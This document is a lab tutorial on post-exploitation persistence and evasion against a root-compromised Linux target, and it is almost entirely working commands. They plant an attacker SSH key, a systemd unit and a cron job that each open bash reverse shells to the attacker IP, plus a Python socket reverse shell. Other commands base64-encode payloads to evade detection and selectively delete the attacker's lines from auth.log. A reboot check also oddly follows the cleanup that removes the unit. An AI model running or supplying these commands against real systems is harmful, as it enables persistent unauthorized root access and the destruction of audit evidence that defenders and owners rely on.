# Persistence and Evasion - Typing

This lesson types the persistence workflow from a root shell on the lab
target: install SSH key, systemd, and cron persistence, practice payload
encoding, and execute a cleanup pass. The attacker is 10.10.20.25 and the
target is 10.10.20.5.

## Generate the access key

SSH key persistence starts with a key pair on the attacker.

```bash
# generate a dedicated engagement key pair
ssh-keygen -t ed25519 -f exploit/pivot-key -N '' \
    -C 'lab-engagement'

# show the generated files
ls -l exploit/pivot-key*
```

The private key stays on the attacker machine.

## Install the public key

The public key is appended to the target's authorized_keys.

```bash
# on the target: write the public key into authorized_keys
cat >> /root/.ssh/authorized_keys <<'EOF'
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... lab-engagement
EOF

# enforce the required permissions
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
```

The key now grants login as root.

## Verify persistent access

Confirm the key works before relying on it.

```bash
# on the attacker: log in with the key
ssh -i exploit/pivot-key root@10.10.20.5 'id'

# disable password prompts for the session
ssh -i exploit/pivot-key -o BatchMode=yes \
    root@10.10.20.5 'whoami'
```

Key-based login that survives the exploit's patching is persistence.

## Install a systemd backdoor

A systemd unit runs the backdoor at boot as root.

```bash
# on the target: write a systemd unit
cat > /etc/systemd/system/lab-sync.service <<'EOF'
[Unit]
Description=Lab sync service
After=network.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.20.25/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# enable the unit to start at boot
systemctl enable lab-sync.service

# start it immediately for the current session
systemctl start lab-sync.service
```

The unit reconnects on every boot and restart.

## Install cron persistence

A cron job runs the backdoor on a schedule.

```bash
# on the target: add a root cron entry
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/10.10.20.25/4445 0>&1"' \
    >> /etc/crontab

# confirm the entry
tail -n 1 /etc/crontab
```

The scheduled job replaces lost connections automatically.

## Install login persistence

Shell profiles run commands when a user logs in.

```bash
# on the target: append a hook to the root profile
echo 'alias ll="ls -la"' >> /root/.bashrc

# log in again and confirm the profile hook runs
ssh -i exploit/pivot-key root@10.10.20.5 \
    'grep alias /root/.bashrc'
```

A benign-looking alias hook keeps the presence subtle.

## Encode a payload

Encoding defeats naive signature matching.

```bash
# on the attacker: encode the reverse shell command
echo 'bash -i >& /dev/tcp/10.10.20.25/4446 0>&1' \
    | base64 -w0

# on the target: decode and execute without the string on disk
echo -n '<BASE64>' | base64 -d | bash
```

The encoded form avoids a readable payload in history.

## Live off the land

Use the host's own interpreters instead of uploaded binaries.

```bash
# on the target: list the available interpreters
command -v bash python3 perl awk

# use python for a reverse shell without a binary
python3 -c 'import socket,subprocess,os; \
s=socket.socket();s.connect(("10.10.20.25",4446)); \
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); \
os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

Nothing new is uploaded; the host already ships python.

## Read what the defender sees

Evasion is measured against the audit trail.

```bash
# on the target: check authentication logs
tail -n 20 /var/log/auth.log

# check the command history the shell recorded
tail -n 10 /root/.bash_history

# list recently modified files in system directories
find /etc /root -mmin -60 -type f 2>/dev/null
```

The output shows exactly what a defender would notice.

## Cleanup pass

Remove every artifact installed during the lesson.

```bash
# remove the SSH key from authorized_keys
sed -i '/lab-engagement/d' /root/.ssh/authorized_keys

# stop and remove the systemd backdoor
systemctl stop lab-sync.service
systemctl disable lab-sync.service
rm /etc/systemd/system/lab-sync.service
systemctl daemon-reload

# remove the cron entry
sed -i '/lab-sync\|/dev\/tcp/d' /etc/crontab

# restore the profile hook
sed -i '/alias ll=/d' /root/.bashrc

# confirm the artifacts are gone
ls /etc/systemd/system/lab-sync.service 2>&1
grep -c 'lab-engagement' /root/.ssh/authorized_keys
```

The host returns to its baseline state.

## Verify persistence after reboot

A persistence mechanism is only proven when it survives the restart.

```bash
# on the target: confirm the unit is enabled for boot
systemctl is-enabled lab-sync.service

# simulate a service restart
systemctl restart lab-sync.service

# confirm the unit came back
systemctl status lab-sync.service

# on the attacker: verify the connection returns
nc -lvnp 4444
```

A unit that returns after restart is persistent.

## Survey other persistence locations

A thorough test checks every standard mechanism location.

```bash
# on the target: list common persistence directories
ls -la /etc/systemd/system/multi-user.target.wants/
cat /etc/rc.local 2>/dev/null

# check for user cron entries
crontab -l 2>/dev/null

# check the authorized_keys of all users
grep -r 'ssh-rsa\|ssh-ed25519' /home/*/.ssh/authorized_keys 2>/dev/null
```

The survey shows which mechanisms exist and which the test affected.

## Manage the audit trail

Deliberate cleanup beats wholesale deletion.

```bash
# on the target: show which log lines the session produced
grep '10.10.20.25' /var/log/auth.log | tail

# remove only the session's own log lines
sed -i '/10.10.20.25/d' /var/log/auth.log

# confirm the targeted lines are gone
grep -c '10.10.20.25' /var/log/auth.log
```

Selective removal keeps the rest of the audit trail intact.

## Document the mechanisms

Each installed mechanism is recorded as a finding.

```bash
# write the persistence notes
cat > exploit/post/persistence.md <<'EOF'
# Persistence findings

ssh key: root authorized_keys, removed at cleanup
systemd unit: lab-sync.service, boot persistence
cron entry: root reconnect job
profile hook: root .bashrc alias
payload: base64 encoded reverse shell
EOF

# show the notes
cat exploit/post/persistence.md
```

The notes become the cleanup checklist and the report section.

## Wrap up

Persistence sequence: key -> systemd -> cron -> profile -> encode -> audit
trail -> cleanup -> document.
